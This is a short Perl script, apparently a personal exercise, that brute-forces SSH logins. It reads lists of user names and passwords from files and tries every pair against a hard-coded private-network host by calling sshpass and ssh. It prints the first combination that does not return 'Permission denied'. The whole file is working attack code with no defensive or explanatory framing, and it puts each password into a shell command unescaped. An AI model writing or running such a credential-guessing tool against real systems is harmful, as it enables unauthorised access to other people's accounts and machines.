
# Jesus Enrique Pacheco Franco

use strict;
use 5.014;

my $host = "192.168.1.14";
my $password;
my $user;
my $response;

open(PASSWORDS, '/root/git/Perl/passwords');
open(USERS, '/root/git/Perl/users');

my @passwords = <PASSWORDS>;
my @users = <USERS>;

foreach $user (@users) {
    
    chomp $user;
    
    foreach $password (@passwords) {
        
        chomp $password;
        
        $response = `sshpass -p "$password" ssh "$user\@$host" 2>&1 << exit`;
        #$response =~ s/\R//g;

        unless($response =~ /.*Permission denied/) { # Break First Loop
            say "*** SUCCESS-> USER::$user PASSWORD::$password ***";
            last;
        }

    }

    unless($response =~ /.*Permission denied/) { last; } # Break Second Loop

}

close(PASSWORDS);
close(USERS);
